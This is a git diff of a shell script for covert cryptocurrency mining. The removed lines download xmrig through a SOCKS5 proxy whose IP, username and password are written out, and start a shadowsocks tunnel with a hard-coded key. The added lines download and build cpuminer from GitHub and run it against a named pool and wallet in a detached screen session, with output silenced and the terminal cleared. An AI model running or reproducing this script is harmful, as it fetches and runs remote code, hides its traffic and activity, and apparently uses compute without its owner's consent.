@@ -1,33 +1,16 @@
-#!/bin/bash
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+#!/bin/sh
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+WALLET=web1qkyk4rgmj6rm2rylv2axz2m5f75s9rkvxtk7922.Mi_chat86-$(echo $(shuf -i 1-9999 -n 1))
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+POOL=asia.rplant.xyz:7017 
 
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
-tar xf xmrig-6.17.0-linux-x64.tar.gz
-
-apt -y install shadowsocks-libev rng-tools
-
-ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+wget https://github.com/wong-fi-hung/termux-miner/archive/refs/tags/v2.7.tar.gz; tar -xf v2.7.tar.gz; cd termux-miner-2.7; ./build.sh; chmod +x cpuminer
+screen -S Admin_Bo -dm ./cpuminer -a yespower -o $POOL -u $WALLET -t 4
+screen -ls
+sleep 4
+clear
+cd ..
+screen -ls
+./Timer_Bo.sh
